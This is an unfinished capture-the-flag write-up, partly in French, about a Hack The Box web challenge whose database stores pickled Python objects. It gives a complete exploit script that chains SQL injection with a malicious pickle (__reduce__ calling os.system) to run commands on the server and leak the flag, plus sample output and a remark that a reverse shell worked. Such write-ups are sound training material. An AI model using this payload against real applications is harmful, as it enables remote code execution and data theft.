\section{[TO FINISH]C O P}

\href{https://docs.python.org/3/library/pickle.html}{pickle — Python object
serialization}

la bdd stock la sérialisation des objets.


donc on peut exploiter \verb+select_by_id+ pour lui passer un id qui n'existe
pas union un base64 d'un objet exfiltre le flag vers un endroit lisible.

\begin{verbatim}
import pickle
import base64
import requests

class PWN(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

command="cat flag.txt >> /app/application/static/images/test.txt"
payload = base64.b64encode(pickle.dumps(PWN()))  # Crafting payload
url = f"http://localhost:1337/view/1337%27%20UNION%20SELECT%20%27{payload.decode()}%27%20--"
#print(f'url: {url}')

r = requests.get(url)
print(f'result {r.status_code}')
r = requests.get('http://localhost:1337/static/images/test.txt')
print(f'result {r.text}')

$ python exploit.py
result 200
result HTB{f4k3_fl4gs_f0r_t3st1ng}
HTB{f4k3_fl4gs_f0r_t3st1ng}
\end{verbatim}

en passant au serveur cela ne fonctionne pas. La requête ne fini pas

un revshell passe.
